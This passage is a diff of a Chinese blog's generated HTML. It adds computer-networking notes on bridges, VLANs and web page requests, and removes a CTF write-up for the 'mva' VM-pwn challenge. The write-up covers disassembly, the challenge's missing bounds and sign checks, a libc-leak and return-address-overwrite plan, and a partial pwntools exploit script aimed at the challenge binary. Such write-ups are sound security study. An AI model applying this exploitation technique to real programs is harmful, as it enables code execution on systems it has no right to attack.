+<li>网桥的问题：当一个局域网中有不止一个网桥时，一个帧可能从一个网桥传到另一个网桥，然后另一个网桥又传回来，导致兜圈子现象
+<ul>
+<li>解决方法：支撑树算法
+<ul>
+<li>互联在一起的网桥彼此通信后，能够找出原来的网络拓扑的一个子集，在这个子集里面整个连通的网络中不存在回路。一旦支撑树确定，网桥会断开某些端口，以确保原来的拓扑是一个支撑树。</li>
+<li>支撑树算法选择一个网桥为树的根，然后以最短路径为依据，找到树上的每一个结点</li>
+<li>为了让支撑树能够反映网络拓扑的变化，每隔几秒钟每个网桥要广播其标识号，和它知道的所有其他网桥</li>
+<li>缺点：互联的局域网数量很大时，支撑树算法开销会显著增加</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>多端口网桥
+<ul>
+<li>链路层可以实现直通交换：帧从入端口转发到出端口不需要收集整个帧，实际上只需要找到帧开头的目的地址即可，这样能够少量减少延迟。</li>
+</ul>
+</li>
+<li>以太网交换机与路由器的比较
+<ul>
+<li>两者都是存储转发设备，但路由器是网络层设备，交换机是链路层设备</li>
+<li>路由器维护的是路由表，实现路由算法，而交换机维护交换表，实现MAC地址过滤和自学习</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/0974156f60dc4b888f0145997aa9e220.png" alt="" /></p>
+<h3 id="644-虚拟局域网vlan"><a class="markdownIt-Anchor" href="#644-虚拟局域网vlan"></a> 6.4.4 虚拟局域网VLAN</h3>
+<p>在一个局域网内，所有的第二层广播流量都将穿过整个局域网，这对于安全性不利，并且传播的数据报数量较大，也会影响效率。</p>
+<p>虚拟局域网VLAN：是基于接口的VLAN，交换机对接口进行分组使得单一的交换机设备可以为多个虚拟的局域网工作，像是多台交换机实现的功能。</p>
+<p>功能：</p>
+<ul>
+<li>流量隔离，一个VLAN内的帧不能传递到其他的VLAN中</li>
+<li>动态分组，交换机的接口可以动态组合，因此VLAN也是可以动态分配的</li>
+<li>数据转发，通过VLAN间路由转发</li>
+</ul>
+<p>trunk接口：多个物理交换机上多个VLAN中的帧发送。VLAN中跨交换机进行转发的帧不能够简单地使用802.1帧格式，而是必须携带VLAN ID信息。802.1q协议（VLAN标记协议）可在trunk接口处增加/删除附加的帧的首部字段</p>
+<h2 id="67-回顾web页面请求的历程"><a class="markdownIt-Anchor" href="#67-回顾web页面请求的历程"></a> 6.7 回顾Web页面请求的历程</h2>
+<ul>
+<li>沿着协议向下依次为应用层、传输层、网络层、链路层</li>
+<li>目标：通过请求www页面场景，识别、回顾、理解协议</li>
+<li>场景：学生在校园网中用笔记本电脑访问www.google.com并接收信息</li>
+</ul>
+<h3 id="step-1-计算机连接到internet"><a class="markdownIt-Anchor" href="#step-1-计算机连接到internet"></a> Step 1: 计算机连接到Internet</h3>
+<p>正在连接的笔记本需要获得校园网局域网的IP地址、网关、DNS服务器等信息。</p>
+<ul>
+<li>DHCP请求依次进行UDP封装、IP封装、802.3以太网帧封装</li>
+<li>以太网向局域网发送广播，由运行DHCP server的网关路由器收到</li>
+<li>以太帧解封装，IP解封装，UDP解封装，得到DHCP请求</li>
+<li>DHCP server生成DHCP ACK报文，包含客户端IP、掩码、网关、DNS服务器</li>
+<li>DHCP server进行封装，将数据帧通过局域网转发（交换机自学习），在客户端进行解封装</li>
+<li>DHCP client收到DHCP ACK应答，现在学生笔记本拥有了自己的IP地址以及DNS服务器、网关</li>
+</ul>
+<h3 id="step-2-arp协议获取网关路由器mac"><a class="markdownIt-Anchor" href="#step-2-arp协议获取网关路由器mac"></a> Step 2: ARP协议获取网关路由器MAC</h3>
+<ul>
+<li>广播发送ARP请求，路由器收到之后发送ARP应答，给出路由器接口的MAC地址</li>
+<li>客户端知道了网关路由器的MAC地址之后就可以发送包含DNS请求的数据帧了</li>
+</ul>
+<h3 id="step-3-dns查询"><a class="markdownIt-Anchor" href="#step-3-dns查询"></a> Step 3: DNS查询</h3>
+<ul>
+<li>将包含DNS查询的IP数据报通过局域网交换机转发到网关路由器</li>
+<li>校园网的IP数据包路由转发到comcast网络（路由表由RIP、OSPF、IS-IS和/或BGP协议产生的DNS服务器）</li>
+<li>多路分解到DNS server</li>
+<li>DNS server向客户端发送包含www.google.com的IP的DNS应答</li>
+</ul>
+<h3 id="step-4-tcp连接"><a class="markdownIt-Anchor" href="#step-4-tcp连接"></a> Step 4: TCP连接</h3>
+<ul>
+<li>客户端首先创建到web服务器的TCP套接字</li>
+<li>TCP SYN报文的域间路由到web server</li>
+<li>web server回应TCP SYNACK</li>
+<li>建立TCP连接</li>
+</ul>
+<h3 id="step-5-http请求与响应"><a class="markdownIt-Anchor" href="#step-5-http请求与响应"></a> Step 5: HTTP请求与响应</h3>
+<ul>
+<li>将HTTP请求发送到TCP socket</li>
+<li>包含HTTP请求的IP数据报路由转发到 <a target="_blank" rel="noopener" href="http://www.google.com">www.google.com</a></li>
+<li>web server进行HTTP reply响应，包含web page</li>
+<li>包含HTTP响应的IP数据报被路由转发回客户端</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC5%E7%AB%A0%E4%B9%A0%E9%A2%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3271,172 +3978,6 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">虎符CTF-2022 mva 题解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-28 23:18:07" itemprop="dateCreated datePublished" datetime="2023-02-28T23:18:07+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-02 17:02:38" itemprop="dateModified" datetime="2023-03-02T17:02:38+08:00">2023-03-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>7.9k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这是一道vm题。前几天师傅让我看看这道题，发现是一种没有做过的类型。查询相关资料之后有了一定的了解。由于是第一次做这种题，就将wp写的尽可能详细一些，作为笔记备查。</p>
-<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
-<p>vm-pwn是一种虚拟机pwn，我的理解是，我们自己用C语言写一个虚拟机。在这个虚拟机里面可以进行各种操作，如加减乘除、堆栈操作等。这里各种操作的操作码可以是我们自己定义的，比如我们定义01开头的指令为加，02开头为减，等等。我们不管当前的主流架构是怎么实现的，这个程序本身相当于是”发明“了一种小型的轻量级的汇编语言。我们需要找到这种语言的漏洞以跳出虚拟机，进而getshell或getflag。</p>
-<p>大致了解了这种题目的背景之后，我们就可以进去看题了。</p>
-<p><img src="1.png" alt="" /></p>
-<p>指令首先是写在了bss段的一个地方，在main函数中有一个死循环，里面的sub_11E9函数应该就是读取指令的函数了。改名为read_cmd。</p>
-<p>这里反汇编看着不太清楚，还是要深入到汇编去查看。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001213                 lea     rdx, code</span><br><span class="line">.text:000000000000121A                 add     rax, rdx</span><br><span class="line">.text:000000000000121D                 mov     eax, [rax]</span><br><span class="line">.text:000000000000121F                 mov     [rbp+var_C], eax</span><br><span class="line">.text:0000000000001222                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001225                 shr     eax, 18h</span><br><span class="line">.text:0000000000001228                 mov     edx, eax</span><br><span class="line">.text:000000000000122A                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000122D                 shr     eax, 8</span><br><span class="line">.text:0000000000001230                 and     eax, 0FF00h</span><br><span class="line">.text:0000000000001235                 or      edx, eax</span><br><span class="line">.text:0000000000001237                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000123A                 shl     eax, 8</span><br><span class="line">.text:000000000000123D                 and     eax, 0FF0000h</span><br><span class="line">.text:0000000000001242                 or      edx, eax</span><br><span class="line">.text:0000000000001244                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001247                 shl     eax, 18h</span><br><span class="line">.text:000000000000124A                 or      eax, edx</span><br></pre></td></tr></table></figure>
-<p>上面这一段汇编是read_cmd里面的，主要功能就是从输入的指令中读取4字节后将这4字节高位变低位，低位变高位（从小端序到大端序的转换）。在read_cmd返回后，eax中存放的就是读取到的指令。读取指令后返回到main函数中，一开始看到main函数下面有很多没有解析的部分，将其手动转为汇编代码，发现有很多跳转指令，那么基本可以判断出，下面就是解析并执行指令的部分了。跳转指令应该是在判断指令的类型。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000135E                 mov     eax, 0</span><br><span class="line">.text:0000000000001363                 call    read_cmd</span><br><span class="line">.text:0000000000001368                 mov     [rbp+var_23C], eax</span><br><span class="line">.text:000000000000136E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001374                 shr     eax, 18h</span><br><span class="line">.text:0000000000001377                 mov     [rbp+var_240], ax</span><br><span class="line">.text:000000000000137E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001384                 sar     eax, 10h</span><br><span class="line">.text:0000000000001387                 mov     [rbp+var_249], al</span><br><span class="line">.text:000000000000138D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001393                 sar     ax, 8</span><br><span class="line">.text:0000000000001397                 mov     [rbp+var_248], al</span><br><span class="line">.text:000000000000139D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013A3                 mov     [rbp+var_247], al</span><br><span class="line">.text:00000000000013A9                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013AF                 mov     [rbp+var_23E], ax</span><br></pre></td></tr></table></figure>
-<p>在调用read_cmd函数之后，main函数将指令的不同位保存到栈中不同的位置，但这些位置基本上相邻。</p>
-<p>下图为栈中保存的指令值情况（假设读取的指令为0x76543210）</p>
-<table align=center>
-<tr align=center>
-	<td> addr </td> <td> +0 </td> <td> +1 </td> <td> +2 </td> <td> +3 </td>
-	<td> +4 </td> <td> +5 </td> <td> +6 </td> <td> +7 </td>
-</tr>
-<tr align=center>
-	<td> rbp-0x250 </td> <td> - </td> <td> - </td> <td> - </td> <td> - </td>
-	<td> - </td> <td> - </td> <td> - </td> <td> 32 </td>
-</tr>
-<tr align=center>
-	<td> rbp-0x248 </td> <td> 54 </td> <td> 76 </td> <td> - </td> <td> - </td>
-	<td> - </td> <td> - </td> <td> - </td> <td> - </td>
-</tr>
-<tr align=center>
-	<td> rbp-0x240 </td> <td> 10 </td> <td> - </td> <td> 76 </td> <td> 54 </td>
-	<td> 76 </td> <td> 54 </td> <td> 32 </td> <td> 10 </td>
-</tr>
-</table>
-<p>之后判断原输入的最低位是否大于0xF，如果大于则跳过该指令。这说明这个虚拟机中的指令码只可能有0x0~0xF最多16种。我们修改一下输入，然后接着跟着执行流一步一步走。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000000206C dword_206C      dd 0FFFFF38Bh           ; DATA XREF: main+134↑o</span><br><span class="line">.rodata:000000000000206C                                         ; main+140↑o</span><br><span class="line">.rodata:0000000000002070                 dd 0FFFFF399h</span><br><span class="line">.rodata:0000000000002074                 dd 0FFFFF3D2h</span><br><span class="line">.rodata:0000000000002078                 dd 0FFFFF460h</span><br><span class="line">.rodata:000000000000207C                 dd 0FFFFF4F0h</span><br><span class="line">.rodata:0000000000002080                 dd 0FFFFF57Eh</span><br><span class="line">.rodata:0000000000002084                 dd 0FFFFF60Ch</span><br><span class="line">.rodata:0000000000002088                 dd 0FFFFF686h</span><br><span class="line">.rodata:000000000000208C                 dd 0FFFFF714h</span><br><span class="line">.rodata:0000000000002090                 dd 0FFFFF735h</span><br><span class="line">.rodata:0000000000002094                 dd 0FFFFF7A7h</span><br><span class="line">.rodata:0000000000002098                 dd 0FFFFF80Ah</span><br><span class="line">.rodata:000000000000209C                 dd 0FFFFF839h</span><br><span class="line">.rodata:00000000000020A0                 dd 0FFFFF8B4h</span><br><span class="line">.rodata:00000000000020A4                 dd 0FFFFF940h</span><br><span class="line">.rodata:00000000000020A8                 dd 0FFFFF994h</span><br></pre></td></tr></table></figure>
-<p>接下来，程序提到了rodata中的这个地方，这里发现这个未知数据的长度为64字节，正好是16*4，每一个4字节对应一条指令，但具体含义尚不清楚。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013D6                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000013DE                 lea     rax, dword_206C</span><br><span class="line">.text:00000000000013E5                 mov     eax, [rdx+rax]</span><br><span class="line">.text:00000000000013E8                 cdqe</span><br><span class="line">.text:00000000000013EA                 lea     rdx, dword_206C</span><br><span class="line">.text:00000000000013F1                 add     rax, rdx</span><br><span class="line">.text:00000000000013F4                 db      3Eh</span><br><span class="line">.text:00000000000013F4                 jmp     rax</span><br></pre></td></tr></table></figure>
-<p>往下看不远处，我们就知道这个64字节数据是用来干嘛的了。它起始就是一个地址的偏移量，将对应指令的偏移量加上rodata的地址值，得到的就是指令对应的执行部分的地址。将其重命名为exec_offset。</p>
-<p>…</p>
-<p>经过亿段时间的分析之后，我大概搞清楚了其中一些指令的含义。</p>
-<p>在这个虚拟机中一共有6个word类型的寄存器，这6个寄存器通过偏移获取。在这16种指令中有加减乘除、与或异或等算数指令，这些指令需要3个操作数。格式为：（下面所有格式均为高地址到低地址，在写入时需要调换一下顺序）</p>
-<blockquote>
-<p>指令码: 2, 功能: 加法, 格式: op1 op2 op3 0x2——reg(op3) = reg(op1) + reg(op2)<br />
-指令码: 3, 功能: 减法, 格式: op1 op2 op3 0x3——reg(op3) = reg(op2) - reg(op1)<br />
-指令码: 4, 功能: 按位与, 格式: op1 op2 op3 0x4——reg(op3) = reg(op2) &amp; reg(op1)<br />
-指令码: 5, 功能: 按位或, 格式: op1 op2 op3 0x5——reg(op3)= reg(op2) | reg(op1)<br />
-指令码: 6, 功能: 右移, 格式: op1 op2 op3 0x6——reg(op3) = reg(op3) &gt;&gt; reg(op2)<br />
-指令码: 7, 功能: 按位异或, 格式: op1 op2 op3 0x7——reg(op3) = reg(op1) ^ reg(op2)<br />
-指令码: 13, 功能: 乘法, 格式: op1 op2 op3 0xD——reg(op3) = reg(op1) * reg(op2) 【注意这里没有检查op2的范围，是一个漏洞】</p>
-</blockquote>
-<p>除此之外，还有一些其他类型的指令，这里也列举一下。</p>
-<blockquote>
-<p>指令码: 0, 功能: 退出, 格式: op1 op2 op3 0x0——exit()<br />
-指令码: 1, 功能: 赋值, 格式: op1 op2 op3 0x1——reg(op3) = op1 + op2 &gt;&gt; 8 (op1 = LOBYTE(op3), op2 = HIBYTE(op3))<br />
-指令码: 9, 功能: 入栈, 格式: op1 op2 op3 0x9——若op3 == 0则push (reg(0))，若op3 != 0则push (op1 + op2 &gt;&gt; 8) 【注意这里虽然有对栈是否满的检查，但是没有对op3大小的检查，可以push虚拟机空间之外的东西，是一个漏洞】<br />
-指令码: 10, 功能: 出栈, 格式: op1 op2 op3 0xA——reg(op3) = pop()【这里有对op3大小和栈是否为空的检查】<br />
-指令码: 12, 功能: 比较两个寄存器的值是否相等。因为返回相等的控制位没有被其他指令所引用，因此这里不做分析。<br />
-指令码: 14, 功能: 寄存器赋值, 格式: op1 op2 op3 0xE——reg(op2) = reg(op3)【注意这里没有检查op2是否为负数，是一个漏洞】<br />
-指令码: 15, 功能: 输出栈顶的值（这里指的是没有被占用的地方，也就是栈实际占用空间还往上一个字的值，这个字现在实际上并没有进入堆栈）</p>
-</blockquote>
-<p>还有8和11的指令码没有分析，不过从官方wp上看这两个应该是无关紧要的，就暂且不管了。</p>
-<p>然后我们需要整理一下思路，想想如何才能利用上面的漏洞getshell。</p>
-<p>要想getshell，首先要拿到libc加载地址，通过这个加载地址得到one_gadget的地址，然后需要将one_gadget地址写入返回地址中。整个过程看似简单，但首先第一个问题：如何拿到libc加载地址？</p>
-<p>注意到赋值操作中目的操作数是没有检查负数的情况的，经过IDA调试发现栈指针在寄存器的低地址处，我们可以让目的操作数为负进而指向栈指针，这样我们就可以用寄存器中的值去覆盖栈指针的值。栈指针是一个8字节结构，对应赋值的偏移应为0xF6、0xF7、0xF8、0xF9，我们将0xF6偏移位置覆盖为0x8000即可让栈指针变为负数。在输出值（指令码0xF）时，这个最高位的0x8000会溢出，从而我们可以读取寄存器后面任何一个位置的地址。经过试验发现，栈指针为0x10C时对应main返回地址最低字，即__libc_start_main+243。我们读取0x10C、0x10D、0x10E三个字的值就可以完全掌握libc的加载地址了。注意这里读取不用0xF指令，因为它只有输出功能，等脚本读到输出之后你的小程序早就执行完了。因此这里使用pop指令，它只会检查栈指针是否为0，因此可以绕过。</p>
-<p><img src="2.png" alt="" /></p>
-<p>在pop之后，我们获得了libc的加载地址，这里需要进行一些计算来获得one_gadget的地址。然后我们将其push到返回地址处就可以了。这里需要注意的是，由于每一个寄存器只有2字节长度，因此返回地址需要用3个寄存器存储，在计算的时候会忽略向高位的借位，因此可能在计算时出错，但这是一个小概率事件，大约有1/4的概率会失败。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00005607BDE667A1 case_9:                                 ; *** code: 9</span><br><span class="line">.text:00005607BDE667A1 mov     rax, [rbp+var_230]              ;     function: if var_230(?) &lt;= 100h then exit</span><br><span class="line">.text:00005607BDE667A1                                         ;               else then ???</span><br><span class="line">.text:00005607BDE667A8 cmp     rax, 100h</span><br><span class="line">.text:00005607BDE667AE jle     short loc_5607BDE667BA</span><br><span class="line">.text:00005607BDE667B0 mov     edi, 0                          ; status</span><br><span class="line">.text:00005607BDE667B5 call    _exit</span><br></pre></td></tr></table></figure>
-<p>请注意上面的代码片段，这是检查栈指针是否大于100。但是跳转是jle，这表示它是有符号的比较。那也就是说如果栈指针是一个负数，如果看做无符号数的话是一个很大的数，但也能通过检查，这就为我们写入返回地址创造了条件。</p>
-<p>因此，大致的步骤就是：</p>
-<p>Step 1: 修改栈指针到返回地址处<br />
-Step 2: 读取返回地址<br />
-Step 3: 计算one_gadget地址<br />
-Step 4: 写入返回地址<br />
-Step 5: getshell</p>
-<p>payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">Libc_libc_start_main = <span class="number">0x23FC0</span></span><br><span class="line">Libc_one_gadget = <span class="number">0xE3B31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_command</span>(<span class="params">code, op1, op2, op3</span>):</span><br><span class="line">	<span class="keyword">return</span> p8(code) + p8(op1) + p8(op2) + p8(op3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movl</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">1</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dest, add1, add2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">2</span>, dest, add1, add2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">dest, subee, suber</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">3</span>, dest, subee, suber)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">band</span>(<span class="params">dest, and1, and2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">4</span>, dest, and1, and2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bor</span>(<span class="params">dest, or1, or2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">5</span>, dest, or1, or2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sar</span>(<span class="params">dest, off</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">6</span>, dest, off, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">dest, xor1, xor2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">7</span>, dest, xor1, xor2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">10</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">dest, imul1, imul2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">13</span>, dest, imul1, imul2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">src, dest</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">14</span>, src, dest, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_top</span>():</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: get __libc_start_main + 243</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x8000</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF9</span>)			<span class="comment"># bypass the check by making it nagative</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x010F</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF6</span>)</span><br><span class="line">payload += pop(<span class="number">0</span>)				<span class="comment"># HIGH WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">1</span>)				<span class="comment"># MIDDLE WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">2</span>)				<span class="comment"># LOW WORD of __libc_start_main</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">243</span>)</span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)			<span class="comment"># this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail</span></span><br><span class="line"><span class="comment"># __libc_start_main got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3FC0</span>)		<span class="comment"># this step may also fail due to same reason, 1/4 to fail until now</span></span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x2</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># libc load address got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3B31</span>)</span><br><span class="line">payload += add(<span class="number">2</span>, <span 